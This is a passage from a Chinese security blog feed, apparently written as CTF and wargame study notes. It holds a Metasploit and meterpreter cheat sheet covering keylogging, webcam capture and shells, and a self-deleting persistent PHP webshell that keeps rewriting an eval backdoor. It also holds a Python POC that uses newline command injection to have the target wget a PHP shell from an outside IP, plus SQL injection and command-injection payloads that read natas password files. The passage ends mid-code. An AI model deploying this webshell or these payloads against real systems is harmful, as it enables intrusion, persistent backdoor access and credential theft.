      <content type="html"><![CDATA[<p>最近在学习的时候越来越多的会用到Metasploit(简称msf)，觉得是一个很强大的工具<a id="more"></a></p>
<h2 id="MSF安装"><a href="#MSF安装" class="headerlink" title="MSF安装"></a>MSF安装</h2><p>如果使用kali的话是自带msf，其他版本的话需要自己下载：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">https:</span><span class="comment">//raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</span></div><div class="line">chmod <span class="number">755</span> msfinstall</div><div class="line">./msfinstall</div></pre></td></tr></table></figure></p>
<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">use exploit <span class="comment">#选用所需要的漏洞利用模块</span></div><div class="line">info <span class="comment">#显示当前所用exploit的详细信息</span></div><div class="line">show options <span class="comment">#显示当前exp攻击信息</span></div><div class="line">show targets <span class="comment">#显示支持的版本</span></div><div class="line">show payloads <span class="comment">#显示当前exp可用的攻击载荷</span></div><div class="line"><span class="built_in">set</span> payloads <span class="comment">#设置要用的攻击载荷</span></div><div class="line"><span class="built_in">set</span> targets <span class="comment">#设置靶机的版本</span></div><div class="line"><span class="built_in">set</span> LHOST <span class="comment">#设置攻击机ip</span></div><div class="line"><span class="built_in">set</span> LPORT <span class="comment">#设置攻击端口</span></div><div class="line"><span class="built_in">set</span> RHOST <span class="comment">#设置靶机ip</span></div><div class="line"><span class="built_in">set</span> RPORT <span class="comment">#设置靶机端口</span></div><div class="line">exploit <span class="comment">#执行渗透攻击或模块来攻击目标</span></div><div class="line">exploit -j <span class="comment">#在计划任务下进行渗透攻击</span></div><div class="line">exploit -h <span class="comment">#列出exploit命令的帮助信息。</span></div><div class="line">sessions <span class="_">-l</span> <span class="comment">#列出可用的交互会话</span></div><div class="line">sessions -i <span class="comment">#选用相应的交互会话</span></div></pre></td></tr></table></figure>
<p>如果攻击成功一般会返回一个meterpreter：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ps <span class="comment">#列出当前系统进程</span></div><div class="line">Kill uid <span class="comment">#消灭指定uid系统进程</span></div><div class="line">keyscan_start <span class="comment">#开始键盘记录软件</span></div><div class="line">webcam_snap <span class="comment">#拍照</span></div><div class="line"><span class="keyword">screenshot </span><span class="comment">#截屏</span></div><div class="line"><span class="keyword">shell </span><span class="comment">#返回一个shell</span></div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MSF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[简单的PHP内存马]]></title>
      <url>http://isron.cn/2017/04/20/php_no_die/</url>
      <content type="html"><![CDATA[<p>在线下赛做权限维持时，最常用的就是上传一个不死shell，其实也就只是把脚本写到了进程里，每隔一段时间便运行一次<a id="more"></a></p>
<h3 id="set-time-limit"><a href="#set-time-limit" class="headerlink" title="set_time_limit()"></a>set_time_limit()</h3><p>set_time_limit — 设置脚本最大执行时间<br>语法:<code>set_time_limit ( int $seconds )</code><br>参数：<code>seconds</code>最大的执行时间，单位为秒。如果设置为0（零），没有时间方面的限制。 </p>
<h3 id="ignore-user-abort"><a href="#ignore-user-abort" class="headerlink" title="ignore_user_abort()"></a>ignore_user_abort()</h3><p>ignore_user_abort — 设置客户端断开连接时是否中断脚本的执行<br>设置为1则不会中断执行</p>
<h3 id="unlink-FILE"><a href="#unlink-FILE" class="headerlink" title="unlink(FILE)"></a>unlink(<strong>FILE</strong>)</h3><p>删除自身</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    set_time_limit(<span class="number">0</span>);</div><div class="line">    ignore_user_abort(<span class="number">1</span>);</div><div class="line">    unlink(<span class="keyword">__FILE__</span>);</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line"></div><div class="line">        file_put_contents(<span class="string">'upload/config.php'</span>,<span class="string">'&lt;?php @eval($_POST["Isron"]);?&gt;'</span>);</div><div class="line">   </div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[七个字符Get Shell]]></title>
      <url>http://isron.cn/2017/04/10/shell-7/</url>
      <content type="html"><![CDATA[<p>如何在只有七个字符的限制下Get Shell<a id="more"></a></p>
<h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>wonderkun师傅在HBCTF出的一个题目<br>源码:<a href="https://github.com/clearloveQAQ/CTF_web/tree/master/web200-3" target="_blank" rel="external">web</a></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>看了师傅的write up才知道有源码泄露<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">d_addslashes</span><span class="params">($array)</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">foreach</span>($array <span class="keyword">as</span> $key=&gt;$value)&#123;</div><div class="line">        <span class="keyword">if</span>(!is_array($value))&#123;</div><div class="line">              !get_magic_quotes_gpc()&amp;&amp;$value=addslashes($value);</div><div class="line">              $array[$key]=$value;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line">          $array[$key]=d_addslashes($array[$key]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $array;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">$_POST = d_addslashes($_POST);</div><div class="line">$_GET =  d_addslashes($_GET);</div><div class="line">$username =<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])?$_POST[<span class="string">'username'</span>]:<span class="keyword">die</span>();</div><div class="line">$password = <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])?md5($_POST[<span class="string">'password'</span>]):<span class="keyword">die</span>();</div><div class="line">$sql=<span class="string">"select password from users  where username='$username'"</span>;</div><div class="line">$result = $conn-&gt;query($sql);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$result)&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("用户名或密码错误!!")&lt;/script&gt;'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>对POST的数据进行了伪全局过滤，所以注入就别想了，最开始还想着时间盲注，Orz，<code>$conn-&gt;query($sql) 返回的是一个mysql resource类型,始终不可能为空</code>所以下一个if语句不可能执行，只需要绕过<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($row[<span class="number">0</span>] === $password)&#123;</div><div class="line">    $_SESSION[<span class="string">'username'</span>]=$username;</div><div class="line">    $_SESSION[<span class="string">'status'</span>]=<span class="number">1</span>;</div><div class="line">    header(<span class="string">"Location:./ping.php"</span>);</div><div class="line">    </div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line">   <span class="keyword">die</span>(<span class="string">"&lt;script&gt;alert('用户名或密码错误!!')&lt;/script&gt;"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>由于输入的用户为空，所以<code>$row</code>必然为空，<code>$password</code>又被md5处理过，所以我们可以：<br><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">username=a&amp;password</span><span class="title">[</span><span class="title">]</span><span class="comment">=a</span></div></pre></td></tr></table></figure></p>
<p>绕过登录限制，登录之后才到主题ping命令，由于必须要是ip格式，所以长度大于等于7小于等于15，fuzz发现||,&amp;,$,(),;,都被替换为了空,但是换行符%0a没有被过滤，那么我们可以0.0.0.0%0a+shell命令，shell命令最多为7个字符，也就是说我们有七个字符的控制空间，通过wonderkun师傅的文章了解到可以通过生成文件的方式getshell，先生成空文件的文件名，然后通过<code>ls -t&gt;a</code>使生成的文件名变为一个新的文件：<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">wget<span class="string">\</span></div><div class="line"> <span class="number">19</span><span class="string">\</span></div><div class="line"><span class="number">2.</span><span class="string">\</span></div><div class="line"><span class="number">16</span><span class="string">\</span></div><div class="line"><span class="number">8.</span><span class="string">\</span></div><div class="line"><span class="number">1.</span><span class="string">\</span></div><div class="line"><span class="number">17</span><span class="string">\</span></div><div class="line"><span class="number">8</span> <span class="string">\</span></div><div class="line">-O <span class="string">\</span></div><div class="line"><span class="number">1.php</span></div></pre></td></tr></table></figure></p>
<p>反斜杠在linuxshell中可以当做连接符，然后通过<code>sh a</code>运行得到shell</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetShell</span><span class="params">()</span>:</span></div><div class="line">    s=requests.session()</div><div class="line">    url = <span class="string">"http://192.168.1.145/web200-3/src/ping.php"</span></div><div class="line">    url1 = <span class="string">"http://192.168.1.145/web200-3/src/"</span></div><div class="line">    header = &#123;</div><div class="line">        <span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span></div><div class="line">    &#125;</div><div class="line">    data1=&#123;<span class="string">'username'</span>:<span class="string">'a'</span>,<span class="string">'password[]'</span>:<span class="string">'a'</span>&#125;</div><div class="line">    s.post(url1,data=data1,proxies=proxy1,headers=header)</div><div class="line"></div><div class="line">    <span class="string">'''</span></div><div class="line">    wget\\</div><div class="line">    \ 19\\</div><div class="line">    2.\\</div><div class="line">    16\\</div><div class="line">    8.\\</div><div class="line">    1.\\</div><div class="line">    17\\</div><div class="line">    8\ \\</div><div class="line">    -O\ \\</div><div class="line">    1.php</div><div class="line">    '''</div><div class="line">    fileNames = [<span class="string">"1.php"</span>, <span class="string">"-O\ \\\\"</span>, <span class="string">"8\ \\\\"</span>, <span class="string">"17\\\\"</span>, <span class="string">"1.\\\\"</span>, <span class="string">"8.\\\\"</span>, <span class="string">"16\\\\"</span>,<span class="string">"2.\\\\"</span>, <span class="string">"\ 19\\\\"</span>, <span class="string">"wget\\\\"</span>]</div><div class="line">    ip = <span class="string">"0.0.0.1%0a"</span></div><div class="line">    <span class="keyword">for</span> fileName <span class="keyword">in</span> fileNames:</div><div class="line">        createFileIp = ip + <span class="string">"&gt;"</span> + fileName</div><div class="line">        <span class="keyword">print</span> createFileIp</div><div class="line">        data = <span class="string">"ip="</span> + createFileIp</div><div class="line"></div><div class="line">        s.post(url, data=data,headers=header,)</div><div class="line">    getShIp = ip + <span class="string">"ls%20-t&gt;1"</span></div><div class="line">    <span class="keyword">print</span> getShIp</div><div class="line">    data = <span class="string">"ip="</span> + getShIp</div><div class="line">    s.post(url, data=data,headers=header)</div><div class="line">    getShellIp = ip + <span class="string">"sh%201"</span></div><div class="line">    <span class="keyword">print</span> getShellIp</div><div class="line">    data = <span class="string">"ip="</span> + getShellIp</div><div class="line">    s.post(url, data=data,headers=header)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    GetShell()</div></pre></td></tr></table></figure>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="http://wonderkun.cc/index.html/?p=524" target="_blank" rel="external">http://wonderkun.cc/index.html/?p=524</a></li>
<li><a href="http://www.moonsos.com/post/256.html" target="_blank" rel="external">http://www.moonsos.com/post/256.html</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[因缺思汀的绕过]]></title>
      <url>http://isron.cn/2017/04/05/shiyanbar/</url>
      <content type="html"><![CDATA[<p>web题主要考察SQL注入，XSS等相关知识。涉及方向较多。此题主要涉及源码审计，MySQL相关的知识<a id="more"></a><br>URL:<code>http://ctf5.shiyanbar.com/web/pcat/index.php</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </div><div class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</div><div class="line">        $StrValue=implode($StrValue);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </div><div class="line">        <span class="keyword">print</span> <span class="string">"水可载舟，亦可赛艇！"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </div><div class="line">    AttackFilter($key,$value,$filter);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</div><div class="line"><span class="keyword">if</span> (!$con)&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line">$db=<span class="string">"XXXXXX"</span>;</div><div class="line">mysql_select_db($db, $con);</div><div class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</div><div class="line">$query = mysql_query($sql); </div><div class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </div><div class="line">    $key = mysql_fetch_array($query);</div><div class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"亦可赛艇！"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">print</span> <span class="string">"一颗赛艇！"</span>;</div><div class="line">&#125;</div><div class="line">mysql_close($con);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>代码看起来不难，在数据库中做一个查询如果用户名密码全部相同则返回<code>flag</code>，如果用户名相同则返回<code>亦可赛艇</code>,再或者返回<code>一颗赛艇</code>，并且过滤了很多sql关键字。<br>sql语句：<code>SELECT * FROM interest WHERE uname = &#39;{$_POST[&#39;uname&#39;]}&#39;</code>发现只对uname进行了查询，而且or没有被过滤，那么就可以利用or构造一个万能用户名<code>&#39; or 1=1 limit 1 #</code>，发现返回<code>亦可赛艇</code>说明绕过了第一个是否存在用户名的权限。<br>第二步则是绕过密码相比较，可以发现在pwd比较时<code>if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;])</code>，用的是双等号，那么说明是存在弱类型的，可以利用NULL == 空字符串那么就可以利用<code>with rollup</code><br>payload：<code>uname=&#39;or 1 group by pwd with rollup limit 1 OFFSET 2#&amp;pwd=</code><br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">group</span> <span class="title">by</span> pwd with rollup : 对pwd进行<span class="keyword">group</span> <span class="title">by</span> 排序，且将最后一个再输出出来赋值为NULL</div><div class="line">limit <span class="number">1</span> OFFSET <span class="number">2</span> ： 从第三个开始取，取一位</div></pre></td></tr></table></figure></p>
<p>由于共有两个用户，所以在<code>group by pwd with rollup</code>时会生成第三个pwd为NULL的数据，然后进行选取得到pwd为NULL，NULL == 空字符串，成功绕过得到flag</p>
<p>limit 与 offset：<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="section">mysql&gt; select * from users limit 1,1;</span></div><div class="line">+----+----------+------------+</div><div class="line"><span class="section">| id | username | password   |</span></div><div class="line">+----+----------+------------+</div><div class="line"><span class="section">|  2 | Angelina | I-kill-you |</span></div><div class="line">+----+----------+------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">mysql默认从第0个开始所以取第二位，第二个参数是取一个</div><div class="line"></div><div class="line"><span class="section">mysql&gt; select * from users limit 1;</span></div><div class="line">+----+----------+----------+</div><div class="line"><span class="section">| id | username | password |</span></div><div class="line">+----+----------+----------+</div><div class="line"><span class="section">|  1 | Dumb     | Dumb     |</span></div><div class="line">+----+----------+----------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">只取一位</div><div class="line"></div><div class="line"><span class="section">mysql&gt; select * from users limit 1 offset 2;</span></div><div class="line">+----+----------+----------+</div><div class="line"><span class="section">| id | username | password |</span></div><div class="line">+----+----------+----------+</div><div class="line"><span class="section">|  3 | Dummy    | p@ssword |</span></div><div class="line">+----+----------+----------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">从第三个开始取一位</div><div class="line"></div><div class="line"><span class="section">mysql&gt; select * from users limit 2 offset 2;</span></div><div class="line">+----+----------+----------+</div><div class="line"><span class="section">| id | username | password |</span></div><div class="line">+----+----------+----------+</div><div class="line">|  3 | Dummy    | p@ssword |</div><div class="line"><span class="section">|  4 | secure   | crappy   |</span></div><div class="line">+----+----------+----------+</div><div class="line">2 rows in set (0.00 sec)</div><div class="line">从第三个开始取两位</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MYSQL </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[natas部分题解]]></title>
      <url>http://isron.cn/2017/03/30/natas/</url>
      <content type="html"><![CDATA[<p>学长推荐了一个网站<a href="http://overthewire.org/wargames/natas/" target="_blank" rel="external">natas.lab</a>有些题目还是蛮有意思的<a id="more"></a></p>
<h2 id="natas9"><a href="#natas9" class="headerlink" title="natas9"></a>natas9</h2><p>URL:<code>http://natas9.natas.labs.overthewire.org</code><br>Username：natas9<br>Password：W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl<br>直接可以查看源码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span></span></div><div class="line">$key = <span class="string">""</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"needle"</span>, $_REQUEST)) &#123;</div><div class="line">    $key = $_REQUEST[<span class="string">"needle"</span>];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($key != <span class="string">""</span>) &#123;</div><div class="line">    passthru(<span class="string">"grep -i $key dictionary.txt"</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>如果key不为空，则调用<a href="http://www.cnblogs.com/end/archive/2012/02/21/2360965.html" target="_blank" rel="external">grep命令</a>,之前做过类似的题目还是忘记了，既然调用了linux命令，而且没进行过滤，那么就可以进行命令执行，与服务器进行交互。<br>payload：<code>http://natas9.natas.labs.overthewire.org/?needle=null ;cat  ../../../../etc/natas_webpass/natas10&amp;&amp;&amp;submit=Search</code></p>
<h2 id="natas11"><a href="#natas11" class="headerlink" title="natas11"></a>natas11</h2><p>URL:<code>http://natas11.natas.labs.overthewire.org/</code><br>Username:natas11<br>Password:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK<br>同样给出源码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span></span></div><div class="line">$defaultdata = <span class="keyword">array</span>( <span class="string">"showpassword"</span>=&gt;<span class="string">"no"</span>, <span class="string">"bgcolor"</span>=&gt;<span class="string">"#ffffff"</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_encrypt</span><span class="params">($in)</span> </span>&#123;</div><div class="line">    $key = <span class="string">'&lt;censored&gt;'</span>;</div><div class="line">    $text = $in;</div><div class="line">    $outText = <span class="string">''</span>;</div><div class="line"></div><div class="line">    <span class="comment">// Iterate through each character</span></div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($text);$i++) &#123;</div><div class="line">    $outText .= $text[$i] ^ $key[$i % strlen($key)];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> $outText;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($def)</span> </span>&#123;</div><div class="line">    <span class="keyword">global</span> $_COOKIE;</div><div class="line">    $mydata = $def;</div><div class="line">    <span class="keyword">if</span>(array_key_exists(<span class="string">"data"</span>, $_COOKIE)) &#123;</div><div class="line">    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[<span class="string">"data"</span>])), <span class="keyword">true</span>);</div><div class="line">    <span class="keyword">if</span>(is_array($tempdata) &amp;&amp; array_key_exists(<span class="string">"showpassword"</span>, $tempdata) &amp;&amp; array_key_exists(<span class="string">"bgcolor"</span>, $tempdata)) &#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/^#(?:[a-f\d]&#123;6&#125;)$/i'</span>, $tempdata[<span class="string">'bgcolor'</span>])) &#123;</div><div class="line">        $mydata[<span class="string">'showpassword'</span>] = $tempdata[<span class="string">'showpassword'</span>];</div><div class="line">        $mydata[<span class="string">'bgcolor'</span>] = $tempdata[<span class="string">'bgcolor'</span>];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $mydata;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveData</span><span class="params">($d)</span> </span>&#123;</div><div class="line">    setcookie(<span class="string">"data"</span>, base64_encode(xor_encrypt(json_encode($d))));</div><div class="line">&#125;</div><div class="line">$data = loadData($defaultdata);</div><div class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"bgcolor"</span>,$_REQUEST)) &#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^#(?:[a-f\d]&#123;6&#125;)$/i'</span>, $_REQUEST[<span class="string">'bgcolor'</span>])) &#123;</div><div class="line">        $data[<span class="string">'bgcolor'</span>] = $_REQUEST[<span class="string">'bgcolor'</span>];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">saveData($data);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas11<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span> <span 